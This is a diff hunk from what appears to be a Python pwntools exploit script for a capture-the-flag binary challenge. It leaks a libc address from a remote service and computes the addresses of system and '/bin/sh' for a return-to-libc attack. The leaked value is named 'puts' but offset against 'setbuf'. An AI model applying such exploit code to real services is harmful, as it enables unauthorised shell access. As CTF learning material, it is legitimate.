@@ -52,12 +52,16 @@ print payload
 r.send("4\n")
 print r.recvuntil("service :)\n")
 
-libc = u32(r.recv(4))
-libc_base = libc - 0x65ff0
-system = libc_base + 0x3ada0
-binsh = libc_base + 0x15b9ab
+puts = u32(r.recv(4))
 
-print "libc: " + hex(libc)
+libc = ELF("/lib/i386-linux-gnu/libc.so.6")
+
+libc.address = puts - libc.symbols["setbuf"]
+
+system = libc.symbols["system"]
+binsh = libc.search("/bin/sh\x00").next()
+
+print "libc: " + hex(libc.address)
 
 print r.recvuntil("> ")
 
